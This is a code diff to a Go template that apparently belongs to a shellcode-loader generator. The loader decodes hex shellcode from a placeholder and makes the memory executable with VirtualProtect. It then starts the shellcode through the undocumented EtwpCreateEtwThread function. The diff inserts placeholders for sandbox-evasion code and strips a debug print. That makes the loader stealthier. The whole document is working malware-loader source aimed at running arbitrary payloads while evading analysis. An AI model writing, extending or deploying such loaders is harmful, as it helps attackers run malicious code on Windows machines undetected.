@@ -2,9 +2,9 @@ package EtwpCreateEtwThread
 
 import (
 	"encoding/hex"
-	"fmt"
 	"unsafe"
 	//__ENCRYPTMODULE__
+	//__SANDBOXMODULE__
 	"golang.org/x/sys/windows"
 )
 
@@ -16,6 +16,7 @@ const (
 )
 
 func main() {
+	//__SANDBOX__
 	shellcode, _ := hex.DecodeString("__SHELLCODE__")
 	//__ENCRYPTCODE__
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
@@ -32,6 +33,4 @@ func main() {
 	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
 	thread, _, _ := EtwpCreateEtwThread.Call(addr, uintptr(0))
 	_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
-
-	fmt.Println("ok")
 }
